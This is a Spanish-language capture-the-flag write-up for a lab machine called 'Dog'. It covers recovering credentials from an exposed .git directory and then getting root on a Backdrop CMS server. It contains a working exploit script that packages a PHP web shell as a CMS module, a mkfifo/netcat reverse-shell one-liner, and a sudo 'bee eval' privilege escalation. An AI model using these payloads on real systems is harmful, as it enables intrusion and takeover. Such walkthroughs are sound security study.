---
title: "Dog"
date: "2025-03-08T00:04:43-05:00"
type: "maquinas"
draft: true
tags: ["backdrop", "bee", "linux", "sudoers", "git-dumper"]
---

### Descripción
Maquina sencilla en la que por medio de un git encontramos credenciales para poder luego hacer uso de un exploit con el cual obtendremos ejecucion de comandos para luego reusar las credenciales con los usuarios que podremos listar, para el root fue explotacion de un binario muy sencillo.

# Enumeración

```jsx
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP -oG allports
sudo nmap -sCV -p22,80 "$ip_target" -A -oN target
```
<a href="https://imgur.com/tzfb8Ub"><img src="https://i.imgur.com/tzfb8Ub.png" title="source: imgur.com" /></a>

Encontramos un git por lo que vamos a usar git-dumper y tratar de restaurar el git, pero primero vamos a instalar la herramienta.

```jsx
pipx install git-dumper
git-dumper http://IP/.git git
cd git
git reset --hard
cat settings.php
```

Y ahí tendremos una contraseña:

<a href="https://imgur.com/a38Rciw"><img src="https://i.imgur.com/a38Rciw.png" title="source: imgur.com" /></a>

Para hallar usuarios validos lo vamos a hacer tambien en el git usando grep de la siguiente forma:

```jsx
grep -r -i -l '@dog.htb' . 2>/dev/null
```

<a href="https://imgur.com/wXcZRsI"><img src="https://i.imgur.com/wXcZRsI.png" title="source: imgur.com" /></a>

# Puerto 80

Ahora con ese usuario y contraseña podemos ingresar, si miramos por la pagina encontraremos la verison en el link http://IP/?q=admin/reports/updates

<a href="https://imgur.com/C3nuz53"><img src="https://i.imgur.com/C3nuz53.png" title="source: imgur.com" /></a>

Y si buscamos encontraremos una vulnerabilidad de esta version [Exploit](https://www.exploit-db.com/exploits/52021).

# Exploit

Vamos a modificar el script para que en vez de .zip nos lo guarde en el formato aceptado .tar.gz

```jsx
import os
import time
import tarfile

def create_files():
    info_content = """
    type = module
    name = Block
    description = Controls the visual building blocks a page is constructed
    with. Blocks are boxes of content rendered into an area, or region, of a<a href="https://imgur.com/4H7qVEl"><img src="https://i.imgur.com/4H7qVEl.png" title="source: imgur.com" /></a>
    web page.
    package = Layouts
    tags[] = Blocks
    tags[] = Site Architecture
    version = BACKDROP_VERSION
    backdrop = 1.x

    configure = admin/structure/block

    ; Added by Backdrop CMS packaging script on 2024-03-07
    project = backdrop
    version = 1.27.1
    timestamp = 1709862662
    """
    shell_info_path = "shell/shell.info"
    os.makedirs(os.path.dirname(shell_info_path), exist_ok=True)  # Crea el directorio
    with open(shell_info_path, "w") as file:
        file.write(info_content)

    shell_content = """
    <html>
    <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php
    if(isset($_GET['cmd']))
    {
    system($_GET['cmd']);
    }
    ?>
    </pre>
    </body>
    </html>
    """
    shell_php_path = "shell/shell.php"
    with open(shell_php_path, "w") as file:
        file.write(shell_content)
    return shell_info_path, shell_php_path

def create_tar(info_path, php_path):
    tar_filename = "shell.tar.gz"
    with tarfile.open(tar_filename, 'w:gz') as tarf:
        tarf.add(info_path, arcname='shell/shell.info')
        tarf.add(php_path, arcname='shell/shell.php')
    return tar_filename

def main(url):
    print("Backdrop CMS 1.27.1 - Remote Command Execution Exploit")
    time.sleep(3)

    print("Evil module generating...")
    time.sleep(2)

    info_path, php_path = create_files()
    tar_filename = create_tar(info_path, php_path)

    print("Evil module generated!", tar_filename)
    time.sleep(2)

    print("Go to " + url + "/admin/modules/install and upload the " +
          tar_filename + " for Manual Installation.")
    time.sleep(2)

    print("Your shell address:", url + "/modules/shell/shell.php")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python script.py [url]")
    else:
        main(sys.argv[1])
```

<a href="https://imgur.com/VJTtoEe"><img src="https://i.imgur.com/VJTtoEe.png" title="source: imgur.com" /></a>

Vamos a usar la siguiente revshell:

```bash
#Nuestra maquina
nc -lvnp 4444

#Pagina
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc IP 4444 >/tmp/f
```

# Usuario

Si listamos usuarios en el home veremos dos usuarios:

<a href="https://imgur.com/XK8ClEV"><img src="https://i.imgur.com/XK8ClEV.png" title="source: imgur.com" /></a>

Usando de nuevo la contraseña que teniamos con johncusak tendremos acceso a la flag de usuario.

# Root

Si listamos permisos sudoers tendremos el bin  `bee` :

<a href="https://imgur.com/zImnC79"><img src="https://i.imgur.com/zImnC79.png" title="source: imgur.com" /></a>

Si ejecutamos el binario veremos lo que podemos hacer, entre esas opciones hay una muy interesante en la cual podemos ejecutar codigo php:

<a href="https://imgur.com/4H7qVEl"><img src="https://i.imgur.com/4H7qVEl.png" title="source: imgur.com" /></a>

Con esta información vamos a tratar de obtener una bash como root:

```bash
sudo bee eval "shell_exec('/bin/bash');”
```

Y listo root facilito e interesante solo tocaba leer.
